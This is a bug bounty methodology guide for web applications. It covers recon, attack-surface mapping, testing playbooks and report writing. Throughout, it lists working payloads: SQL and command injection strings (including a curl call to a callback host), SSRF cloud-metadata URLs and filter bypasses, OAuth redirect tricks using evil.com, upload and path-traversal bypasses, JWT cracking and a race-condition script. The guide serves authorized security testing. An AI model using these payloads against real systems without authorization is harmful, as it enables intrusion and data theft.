# Systematic Web Application Bug Hunting Methodology

A practical methodology for finding high/critical severity vulnerabilities in web applications during bug bounty engagements. Focused on what actually produces bounties, not textbook checklists.

---

## Phase 0 — Program Selection (30 min)

Before touching the target, evaluate whether it's worth your time.

**Read the program page completely:**
- Bounty table — what severity levels pay what? Programs that pay $100 for a critical are not worth expert-level effort.
- Scope — in-scope domains, out-of-scope areas, excluded bug types. Read this twice. Out-of-scope submissions burn trust.
- Response metrics — what's the average time to first response, time to bounty? Programs with 90-day response times will waste your momentum.
- Policy — safe harbor language, testing restrictions, rate limiting rules, no automated scanning clauses.

**Check disclosed reports (hacktivity):**
- What bug classes have been rewarded? That tells you what the program values.
- What's the actual payout for each severity? Listed bounty tables are maximums — actuals are often lower.
- How many reports are disclosed? Programs that never disclose are harder to calibrate.
- When were reports disclosed? Recent disclosures mean recent fixes — check if the fix was complete.

**Evaluate competition:**
- Google: `site:hackerone.com "targetname"` or `site:bugcrowd.com "targetname"`
- Search for writeups: `"targetname" bug bounty writeup`
- If you find 20 blog posts about their auth flow, don't hunt auth. Hunt something else.

**Pick your lane:**
- New programs or recently expanded scope = lowest competition
- Large scope with many assets = room to find forgotten corners
- Programs with fast response times = faster feedback loop = faster learning

---

## Phase 1 — Reconnaissance (2-4 hours)

Recon is not about collecting the most subdomains. It's about building a mental model of what the application does, what technologies it uses, and where the trust boundaries are.

### 1.1 — Understand the Business Logic

Before any technical work, understand what the application DOES:

- What's the core product? (marketplace, SaaS tool, social platform, fintech, etc.)
- Who are the user roles? (anonymous, free user, paid user, admin, API consumer, merchant, support agent)
- What are the high-value actions? (payments, data export, account deletion, privilege changes, file uploads)
- What data is sensitive? (PII, financial data, health records, private messages, API keys)

This matters because **the highest-impact bugs are logic bugs in business-critical flows**, and you can't find those without understanding the business.

### 1.2 — Map the Technology Stack

Identify:
- **Frontend framework**: React, Angular, Vue, Next.js, server-rendered — determines client-side attack surface
- **API style**: REST, GraphQL, gRPC-web, WebSocket — determines how to enumerate endpoints
- **Authentication**: session cookies, JWT, OAuth, API keys, SSO — determines auth attack surface
- **CDN/WAF**: Cloudflare, Akamai, AWS WAF — determines what payloads get blocked and how to bypass
- **Backend hints**: response headers (`X-Powered-By`, `Server`), error page formats, cookie names (`PHPSESSID`, `connect.sid`, `JSESSIONID`), URL patterns (`.php`, `.aspx`, `/api/v2/`)
- **Third-party integrations**: payment processors, email services, OAuth providers, analytics — each integration is a trust boundary

**How to identify:**
```
# Response headers
curl -sI https://target.com | grep -iE 'server|x-powered|x-frame|content-security|set-cookie'

# JavaScript framework detection
# Look at page source for: __NEXT_DATA__, ng-app, data-reactroot, nuxt

# Wappalyzer browser extension does most of this automatically
```

### 1.3 — Asset Discovery

**Subdomain enumeration:**
```bash
# Passive sources (no direct target interaction)
subfinder -d target.com -silent | sort -u > subs.txt
amass enum -passive -d target.com >> subs.txt

# DNS brute force (moderate interaction)
puredns bruteforce wordlist.txt target.com -r resolvers.txt >> subs.txt

# Verify which are alive
httpx -l subs.txt -silent -status-code -title -tech-detect > alive.txt
```

**Don't drown in subdomains.** 10,000 subdomains are useless if you don't know which ones matter. Prioritize:
1. Subdomains with login pages or admin panels
2. API endpoints (`api.`, `gateway.`, `graphql.`)
3. Staging/dev environments (`staging.`, `dev.`, `beta.`, `test.`)
4. Internal tools accidentally exposed (`jenkins.`, `grafana.`, `kibana.`, `admin.`)
5. Anything that looks forgotten or old

### 1.4 — Endpoint Discovery

**For traditional web apps:**
- Browse the application manually with Burp proxy capturing everything
- Create accounts at every privilege level available (free, trial, etc.)
- Exercise every feature: profile, settings, uploads, exports, sharing, integrations
- Check `robots.txt`, `sitemap.xml`, `/.well-known/`
- JavaScript file analysis:
```bash
# Extract API endpoints from JS bundles
# In Burp: Target > Sitemap > filter for .js > search for /api, fetch(, axios, xhr
# Or use tools like LinkFinder, JSParser
```

**For SPAs / API-driven apps:**
- The real attack surface is the API, not the UI
- Proxy all traffic and build a complete endpoint map
- Look for API documentation: `/docs`, `/swagger`, `/openapi.json`, `/graphql` (introspection)
- Try common API versioning: `/api/v1/`, `/api/v2/`, `/api/internal/`
- GraphQL introspection:
```graphql
{__schema{types{name,fields{name,args{name,type{name}}}}}}
```

### 1.5 — Content Discovery

```bash
# Directory brute force — use TARGETED wordlists, not massive generic ones
feroxbuster -u https://target.com -w /path/to/SecLists/Discovery/Web-Content/raft-medium-words.txt \
  -x php,json,xml,txt,bak,old,conf -k --smart

# Technology-specific wordlists matter:
# PHP app → php-specific wordlists
# .NET app → aspx, ashx, asmx extensions
# Node/Next.js → _next/data/, api/ routes
```

**What you're looking for:**
- Backup files (`.bak`, `.old`, `.swp`, `~`)
- Configuration files (`.env`, `config.json`, `settings.py`, `web.config`)
- Debug endpoints (`/debug`, `/trace`, `/actuator`, `/metrics`, `/health`)
- Admin panels (`/admin`, `/dashboard`, `/manage`, `/internal`)
- API documentation (`/swagger`, `/docs`, `/graphql`)
- Source maps (`.js.map`) — these literally give you the source code

---

## Phase 2 — Attack Surface Mapping (1-2 hours)

Take everything from Phase 1 and build a structured attack surface map. This is a document, not a mental model — write it down.

### The Map

For each significant endpoint/feature, record:

```
Feature: [name]
Endpoint: [method] [path]
Auth required: [none / session / token / specific role]
Input parameters: [list with types]
What it does: [one sentence]
Trust boundary: [does it cross one?]
Interesting because: [why this might be vulnerable]
```

### Prioritize by Impact

Rank your mapped features by "what's the worst thing that could happen if this is broken":

**Tier 1 — Hunt these first:**
- Authentication (login, registration, password reset, MFA, SSO)
- Authorization (access controls, role checks, IDOR on every object)
- Payment/financial operations
- File upload/download
- Data export (bulk data access)
- Account takeover vectors
- Admin functionality

**Tier 2 — Hunt these second:**
- User input that gets rendered (XSS surfaces)
- Search/filter functionality (injection surfaces)
- Integrations and webhooks (SSRF, callback abuse)
- Email functionality (header injection, template injection)
- Import/parsing functionality (XXE, deserialization)

**Tier 3 — Hunt if time permits:**
- Information disclosure
- Rate limiting issues
- CORS misconfigurations
- Cache poisoning
- Open redirects (only valuable as chain components)

---

## Phase 3 — Systematic Testing (bulk of your time)

Work through your prioritized map. For each feature, apply the relevant test playbook below. Don't shotgun everything — go deep on one feature at a time.

### 3.1 — Authentication Testing

**Password reset flow — the single most common source of account takeover:**
- Is the reset token in the URL? Check if it leaks via Referer header to third parties
- Token entropy — is it guessable? Short numeric codes? Timestamp-based?
- Token expiry — does it expire? After how long? After use?
- Token binding — can you use user A's reset link to reset user B's password?
- Host header injection — change the `Host` header in the reset request. Does the reset email contain your injected host? If so, you can steal tokens.
- Rate limiting — can you brute force the reset code?

**Login flow:**
- Default credentials on admin panels
- Username enumeration (different responses for valid vs invalid usernames)
- Account lockout bypass
- Authentication bypass via parameter manipulation (`admin=true`, role escalation parameters)

**Session management:**
- Session fixation — does the session ID change after login?
- Session invalidation — does logging out actually destroy the server-side session?
- Concurrent sessions — is there a limit? Can you hijack an active session?
- Cookie flags — HttpOnly, Secure, SameSite

**OAuth/SSO:**
- `state` parameter — is it present? Is it validated? CSRF via OAuth without state.
- `redirect_uri` validation — can you manipulate it? Try:
  - `redirect_uri=https://evil.com`
  - `redirect_uri=https://target.com.evil.com`
  - `redirect_uri=https://target.com%40evil.com`
  - `redirect_uri=https://target.com/callback/../../../evil-path`
  - `redirect_uri=https://target.com/callback?next=https://evil.com`
- Token leakage — does the access token appear in URLs, logs, or Referer headers?
- IdP confusion — if multiple SSO providers, can you link accounts across them?

**JWT (if used):**
```bash
# Decode and inspect
echo "$JWT" | cut -d. -f2 | base64 -d 2>/dev/null | jq .

# Test for algorithm confusion
# Change alg to "none" — does the server accept it?
# Change alg from RS256 to HS256 — sign with the public key as HMAC secret

# Check for weak secrets
hashcat -m 16500 "$JWT" /path/to/wordlist.txt

# Check claims: exp (expiry), aud (audience), iss (issuer) — are they validated?
```

### 3.2 — Authorization Testing (IDOR & Access Control)

This is the single highest-ROI bug class for web apps. Every endpoint that accesses a resource by ID is a potential IDOR.

**Methodology:**
1. Create two accounts (Account A and Account B) at the same privilege level
2. As Account A, perform every action and capture the requests
3. Extract every object ID (user ID, order ID, document ID, etc.)
4. Replay each request as Account B — can B access A's resources?
5. Replay each request with no authentication — does it work unauthenticated?

**Common IDOR patterns:**
```
GET /api/users/12345/profile          → change 12345 to another user's ID
GET /api/documents/abc-def-ghi        → change the UUID
GET /api/orders?user_id=12345         → change user_id parameter
POST /api/messages {"to": "user_a"}   → can you send as someone else?
DELETE /api/posts/67890               → can you delete others' posts?
PUT /api/users/12345/role             → can you escalate your own role?
```

**ID type matters:**
- Sequential integers (12345) — trivially enumerable
- UUIDs — not guessable, but often leaked in other responses, URLs, or JS
- Encoded IDs (base64, hex) — decode them, they're often sequential underneath

**Don't just test GET requests.** The highest-impact IDORs are on state-changing operations:
- Modifying another user's data (PUT/PATCH)
- Deleting another user's resources (DELETE)
- Performing actions as another user (POST)
- Accessing another user's sensitive data (invoices, messages, medical records)

**Privilege escalation:**
- Can a free user access paid features by calling the API directly?
- Can a regular user access admin endpoints?
- Can a user of Organization A access Organization B's data?
- Do API endpoints enforce the same permissions as the UI?

### 3.3 — Injection Testing

**SQL Injection:**
```
# Classic detection
' OR 1=1--
' OR '1'='1
' UNION SELECT NULL--
" OR ""="

# Time-based blind (when no visible output)
' OR SLEEP(5)--
' OR pg_sleep(5)--
'; WAITFOR DELAY '0:0:5'--

# Error-based (force the DB to reveal info in errors)
' AND 1=CONVERT(int,(SELECT @@version))--

# Where to test: EVERY user input that might hit a database
# Search fields, filter parameters, sort parameters, ID parameters
# Don't forget: HTTP headers (X-Forwarded-For, Referer, User-Agent) 
# that get logged to a database
```

**Don't just test obvious inputs.** The SQLi that earns bounties is in:
- Sort/order parameters: `?sort=name` → `?sort=name;SELECT+...`
- Filter/search: complex filter expressions that get built into queries
- Batch/bulk operations: array parameters that get iterated into queries
- Import/CSV upload: values that get INSERT'd
- Headers that get logged: `User-Agent`, `X-Forwarded-For`

**Server-Side Template Injection (SSTI):**
```
# Detection polyglot
{{7*7}}
${7*7}
<%= 7*7 %>
#{7*7}
*{7*7}

# If 49 appears in the output, you have SSTI → usually RCE
# Where to test: anywhere user input appears in rendered templates
# Email templates, PDF generation, notification templates, 
# custom page builders, report generators
```

**Command Injection:**
```
# Where it hides: file processing, PDF generation, image conversion,
# DNS lookups, ping/traceroute tools, git operations, CI/CD integrations

# Detection
; sleep 5
| sleep 5
`sleep 5`
$(sleep 5)
& ping -c 5 127.0.0.1 &

# Blind detection via DNS/HTTP callback
; curl https://your-collaborator-url
| nslookup your-collaborator-domain
```

### 3.4 — Server-Side Request Forgery (SSRF)

**Where SSRF lives:**
- URL input fields (profile picture URL, webhook URL, import from URL, RSS feed URL)
- PDF generators that render HTML (fetch external resources)
- File importers (import from Google Drive, Dropbox, URL)
- Integration/webhook configuration
- OAuth callback URLs
- Proxy/redirect endpoints

**Testing:**
```
# Cloud metadata (the classic high-impact SSRF)
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/

# Internal network scanning
http://127.0.0.1:8080
http://localhost:3000
http://10.0.0.1
http://192.168.1.1

# Bypass filters
http://0x7f000001        (hex IP)
http://2130706433        (decimal IP)
http://0177.0.0.1        (octal)
http://127.1             (short form)
http://[::1]             (IPv6 localhost)
http://target.com@evil.com  (URL parsing confusion)
http://evil.com#@target.com (fragment confusion)

# DNS rebinding — register a domain that alternates between 
# your IP and 127.0.0.1 to bypass DNS-based SSRF filters
```

### 3.5 — File Upload

**Test checklist:**
- Upload a `.php`, `.jsp`, `.aspx` file — does it execute?
- Bypass extension filters: `.php5`, `.phtml`, `.php.jpg`, `.php%00.jpg`
- Bypass content-type checks: change `Content-Type` to `image/jpeg` while uploading PHP
- SVG with embedded JavaScript (XSS via SVG)
- XXE via SVG, DOCX, XLSX (these are XML-based formats)
- Path traversal in filename: `../../../etc/cron.d/evil`
- Oversize files (DoS), polyglot files, zip bombs
- Where does the file end up? Same domain? CDN? S3 bucket? Can you access it directly?

### 3.6 — Cross-Site Scripting (XSS)

XSS is overcrowded but still pays on many programs. Focus on **stored XSS** and **XSS in sensitive contexts** (admin panels, other users' views).

**Where to look (beyond the obvious):**
- File upload filenames — does the filename render somewhere without escaping?
- Markdown/rich text editors — can you break out of the sanitizer?
- Error messages that reflect input
- PDF/document generation that renders user content
- Email content that renders in a webmail view
- SVG files served from the same origin
- URL fragments and path parameters in SPAs
- WebSocket messages rendered in chat interfaces
- Third-party embeds (YouTube URL, tweet embed) — can you inject via the embed URL?

**Modern XSS bypasses:**
```html
<!-- CSP bypasses -->
<script src="https://allowed-cdn.com/angular.js"></script>
<!-- If Angular is allowed, use Angular template injection -->

<!-- DOM-based XSS — look for dangerous sinks in JS -->
document.write()
innerHTML
outerHTML
eval()
setTimeout/setInterval with string args
location.href = user_input
jQuery.html()
$.append()
postMessage handlers without origin checks
```

### 3.7 — Race Conditions

**Where races matter:**
- Coupon/discount redemption (apply the same code twice simultaneously)
- Money transfers (send $100 twice with only $100 balance)
- Like/vote/follow operations (inflate counts)
- Invitation acceptance (accept same invite from multiple accounts)
- Limited-quantity purchases (buy more than stock allows)
- Account linking (link same external account to two internal accounts)

**How to test:**
```python
# Use Turbo Intruder (Burp extension) or write a script
# Send 20-50 identical requests simultaneously
# The key is TRUE concurrency, not sequential fast requests

import asyncio
import aiohttp

async def send_request(session, url, data):
    async with session.post(url, json=data) as resp:
        return await resp.json()

async def race():
    async with aiohttp.ClientSession() as session:
        tasks = [send_request(session, url, data) for _ in range(50)]
        results = await asyncio.gather(*tasks)
        # Check: did more than one succeed?
```

Burp Suite's "Send group in parallel" (single-packet attack) in Repeater is the easiest way to test this.

### 3.8 — GraphQL-Specific Testing

```graphql
# Introspection (if enabled — often is)
{__schema{queryType{name}mutationType{name}types{name kind fields{name type{name}}}}}

# Batch queries (bypass rate limiting)
[{"query":"mutation{login(u:\"a\",p:\"1\")}"}, {"query":"mutation{login(u:\"a\",p:\"2\")}"}]

# Deeply nested queries (DoS)
{user{friends{friends{friends{friends{name}}}}}}

# Field suggestions in error messages (leak field names)
{user{pasword}}  # typo → "Did you mean password?"

# Authorization bypass — query fields/mutations the UI doesn't expose
# If the schema shows an adminDeleteUser mutation, try it
```

---

## Phase 4 — Chaining & Escalation

The difference between a $200 bug and a $5,000 bug is often chaining. Individually low-impact bugs become critical when combined.

**Common chains:**
- Open Redirect + OAuth token leak = Account Takeover
- SSRF + Cloud metadata = RCE (via IAM credentials)
- Self-XSS + CSRF = Stored XSS on victim
- Information disclosure (API key leak) + API access = full account control
- IDOR (read) + sensitive data = privacy violation escalation
- Race condition + payment logic = financial impact

**When writing reports, always demonstrate the maximum impact.** Don't report "I can read another user's email address." Report "I can read another user's email address, phone number, home address, and payment history, affecting all 2 million users."

---

## Phase 5 — Reporting

A well-written report is the difference between "resolved as informative" and "bounty awarded." Triagers are overworked and reading 100 reports a day.

### Report Template

```markdown
## Title
[Verb] [what] [where] — [impact]
Example: "IDOR on /api/v2/invoices allows any authenticated user 
to download all customer invoices"

## Summary
One paragraph: what the bug is, where it is, and what an attacker gains.
No fluff. No "during my security assessment of your esteemed platform."

## Severity
Your CVSS assessment with justification.

## Steps to Reproduce
1. Numbered steps
2. That anyone can follow
3. Without ambiguity
4. Include exact URLs, parameters, headers
5. Include screenshots at key steps

## Proof of Concept
# Exact curl command or HTTP request that demonstrates the bug
curl -H "Authorization: Bearer USER_B_TOKEN" \
  "https://target.com/api/v2/invoices/USER_A_INVOICE_ID"

## Impact
What can an attacker do? How many users are affected?
Be specific and concrete. "All 2 million users' payment history 
is accessible" not "data may be at risk."

## Remediation
Short, specific fix suggestion. One paragraph max.
```

### Report Quality Tips

- **Reproducibility is everything.** If the triager can't reproduce it, it gets closed. Test your own steps from scratch.
- **One bug per report.** Don't bundle 5 findings into one report.
- **Video PoC** for complex bugs — 60-second screen recording is worth 1000 words.
- **Don't over-explain.** Triagers know what IDOR is. Show, don't lecture.
- **Respond quickly** to questions. Programs prioritize responsive researchers.

---

## Tooling Essentials

**You need:**
- **Burp Suite Pro** — the single most important tool. Learn it deeply. Repeater, Intruder, extensions. Community edition works but Pro is worth the investment.
- **Browser DevTools** — Network tab, Console, Application tab (cookies, localStorage, tokens)
- A **second browser / private window** for multi-account testing

**Useful Burp extensions:**
- Autorize — automatic IDOR/auth testing (replays requests as lower-privileged user)
- Logger++ — better request logging and search
- Turbo Intruder — race conditions and high-speed testing
- JSON Web Tokens — JWT manipulation
- Param Miner — hidden parameter discovery
- Active Scan++ — better active scanning

**Useful CLI tools:**
- `subfinder`, `amass` — subdomain discovery
- `httpx` — HTTP probing
- `nuclei` — template-based scanning for known issues (good for finding low-hanging fruit, not for finding novel bugs)
- `ffuf` or `feroxbuster` — content discovery
- `sqlmap` — SQL injection exploitation (only use AFTER you've confirmed the injection point manually)

**Useful services:**
- Burp Collaborator / interactsh — out-of-band detection (blind SSRF, blind XSS, blind SQLi)
- Webhook.site — quick HTTP callback receiver

---

## Time Management

Bug bounty hunting has extreme variance. You might find nothing for 40 hours, then find 3 bugs in one afternoon. Managing your time and mental state matters.

- **Set time limits per target.** 8-16 hours of focused hunting. If nothing after that, rotate.
- **Set time limits per feature.** 1-2 hours deep dive. If no leads, move to the next feature.
- **Don't tunnel vision.** If you've spent 4 hours trying to bypass one WAF rule, step back and find a different attack surface.
- **Take notes obsessively.** What you tested, what you ruled out, what looked interesting but you didn't finish. Your notes from Tuesday's failed hunt become Wednesday's lead.
- **Hunt in focused blocks.** 3-4 hours of concentrated testing beats 8 hours of distracted browsing.
- **Recognize when you're grinding vs hunting.** Grinding is running wordlists and hoping. Hunting is reading code, understanding logic, and targeting specific hypotheses.

---

## The Mindset

The bugs that pay well are not found by running scanners. They're found by understanding what the application is SUPPOSED to do and then figuring out how to make it do something it SHOULDN'T.

Every feature is a question: "What assumption did the developer make here, and is that assumption always true?"

- "They assumed users only submit their own user ID" → IDOR
- "They assumed the price comes from the server" → client-side price manipulation
- "They assumed this endpoint is only called by the frontend" → direct API abuse
- "They assumed the file extension determines the file type" → upload bypass
- "They assumed this action only happens once" → race condition
- "They assumed internal services aren't reachable" → SSRF

Find the assumption. Break the assumption. Demonstrate the impact. Write it up. Get paid.
